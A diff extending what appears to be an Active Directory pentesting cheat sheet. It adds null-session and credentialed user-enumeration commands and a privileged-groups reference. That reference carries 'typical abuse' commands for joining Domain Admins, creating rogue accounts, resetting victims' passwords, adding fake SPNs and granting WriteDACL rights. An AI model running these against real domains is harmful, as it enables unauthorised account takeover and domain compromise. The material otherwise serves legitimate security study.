@@ -92,7 +92,12 @@ Our goal here is to find valid user names
 ```bash
 smbclient -L //<IP> -N
 crackmapexec smb <IP> --shares -u '' -p ''
+crackmapexec smb <IP> --shares -u 'Guest' -p ''
 enum4linux -a <IP>
+netexec smb <IP> -u '' -p '' --rid-brute
+netexec smb <IP> -u guest -p '' --rid-brute
+impacket-lookupsid domain.local/@<IP> -no-pass
+impacket-lookupsid domain.local/guest@<IP> -no-pass
 ```
 ##### prcclient
 ```bash
@@ -153,6 +158,23 @@ gpp-decrypt <cpassword>
 <summary><strong>Attacking with credentials</strong></summary>
 
 ### Attacking with credentials
+#### Search for users
+```bash
+impacket-lookupsid domain/user:password@IP
+#Null session
+impacket-lookupsid anonymous@IP
+impacket-lookupsid domain/guest:@IP
+
+netexec smb <IP> -u user -p password --rid-brute
+netexec ldap <IP> -u user -p password --users
+netexec smb 10.129.1.137 -u user -p 'password' --users
+impacket-GetADUsers domain.local/user:password -dc-ip <IP>
+impacket-GetADUsers domain.local/user:password -dc-ip <IP> -all
+
+rpcclient -U "domain.local\\user%password" <IP>
+ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"
+```
+
 #### Kerberoasting
 TGS hash
 ```bash
@@ -464,3 +486,179 @@ crackmapexec smb <IP> --shares -u '' -p ''
 crackmapexec smb <IP> --shares -u user -p password
 ``` 
 </details>
+
+# Privileged Groups & Domain Escalation Reference
+
+---
+
+# Built-in High Privilege Groups
+
+---
+
+##  Domain Admins
+
+**Full domain control**
+
+Members of this group have complete control over the domain.
+
+### Can:
+- Create/delete users
+- Reset any password
+- Modify any group
+- Modify GPOs
+- Perform DCSync
+- Access all domain machines as local admin
+- Log in to Domain Controllers
+
+### Typical Abuse:
+```powershell
+net group "Domain Admins" user /add /domain
+```
+
+---
+
+## 🏛 Enterprise Admins
+
+**Forest-wide control**
+
+This group exists only in multi-domain forests.
+
+### Can:
+- Full control across all domains in the forest
+- Modify forest configuration
+- Schema modification
+- Add Domain Admins in any domain
+
+⚠ Extremely sensitive group.
+
+---
+
+##  Administrators (Built-in)
+
+Built-in local administrators group on Domain Controllers.
+
+### Can:
+- Full control over the Domain Controller
+- Equivalent to Domain Admin on the DC
+- Manage services, registry, files, security settings
+
+---
+
+# Delegated Privilege Groups
+
+---
+
+## 🛠 Account Operators
+
+Delegated administrative group.
+
+### Can:
+- Create new users
+- Create new groups
+- Modify normal users
+- Reset passwords (non-protected users)
+
+### Cannot:
+- Modify Domain Admins
+- Modify Enterprise Admins
+- Modify protected users (AdminSDHolder)
+- Modify Schema Admins
+
+### Typical Abuse:
+```powershell
+net user pwned P@ssw0rd123! /add /domain
+net group "Some Group" pwned /add /domain
+```
+
+---
+
+##  Server Operators
+
+### Can:
+- Log onto Domain Controllers
+- Start/stop services
+- Backup/restore files
+- Potential privilege escalation via service abuse
+
+---
+
+## 🖥 Backup Operators
+
+### Can:
+- Bypass file permissions
+- Read any file on DC (including NTDS.dit)
+- Potential offline hash extraction
+
+---
+
+## 🛠 Print Operators
+
+### Can:
+- Manage printers on DC
+- Historically exploitable for privilege escalation (e.g., PrinterBug)
+
+---
+
+# Important AD Protection Mechanisms
+
+---
+
+##  AdminSDHolder
+
+- Protects privileged accounts
+- Applies every 60 minutes
+- Prevents delegated permission abuse on protected users
+
+Protected groups include:
+- Domain Admins
+- Enterprise Admins
+- Schema Admins
+- Administrators
+
+---
+
+# Common Escalation Scenarios
+
+---
+
+## If you have GenericAll over a user:
+```powershell
+Set-ADAccountPassword -Identity victim -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
+```
+
+---
+
+## If you have GenericWrite over a user:
+Add fake SPN → Kerberoast
+```powershell
+Set-ADUser -Identity victim -ServicePrincipalNames @{Add='fake/http'}
+```
+
+---
+
+## If you have WriteDACL:
+Grant yourself full rights:
+```powershell
+Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
+```
+
+---
+
+## If you control a group:
+Add yourself:
+```powershell
+net group "Target Group" attacker /add /domain
+```
+
+---
+
+# Quick Mental Model
+
+| Group | Scope | Risk Level |
+|-------|-------|------------|
+| Domain Admins | Domain | Critical |
+| Enterprise Admins | Forest | Critical |
+| Administrators | Domain Controller | Critical |
+| Account Operators | Delegated | High |
+| Backup Operators | DC File Access | High |
+| Server Operators | DC Services | High |
